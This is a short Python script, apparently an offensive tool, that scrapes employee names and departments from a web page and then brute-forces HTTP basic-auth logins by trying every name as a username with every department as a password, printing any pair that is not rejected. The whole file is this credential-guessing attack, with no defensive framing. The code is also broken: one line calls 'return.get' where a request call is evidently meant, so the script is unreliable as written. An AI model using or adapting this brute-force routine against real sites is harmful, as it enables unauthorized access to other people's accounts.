import requests 
from bs4 import BeautifulSoup as bs4

def dwnldPage(url):
	r = requests.get(url)
	response = r.content
	return response

def findNames(response):
	parser = bs4(response, 'html.parser')
	names = parser.find_all('td',  id='name')
	output = []
	for name in names:
		output.append(name.text)
	return output

def findDepts(response):
	parser = bs4(response, 'html.parser')
	depts = parser.find_all('td', id="department")
	output = []
	for dept in depts:
		output.append(dept.text)
	return output

def getAuthorized(url, username, password):
	r = return.get(url, auth=(username, password))
	if str(r.status_code) != '401':
		print("\n[!] Username : {} and Password : {} with Code : {}.\n".format(username, password, str(r.status_code)))

site = input("Enter the URL to get username and pass (Format- http://www.example.com).")
page = dwnldPage(site)

names = findNames(page)
uniqNames = sorted(set(names))

depts = findDepts(page)
uniqDepts = sorted(set(depts))

login = input ("Enter the login page URL (Format- http://www.example.com/login.php)")

print("[*] Starting bruteforce...\n\n")

for name in uniqNames:
	for dept in uniqDepts:
		getAuthorized(login, name, dept)

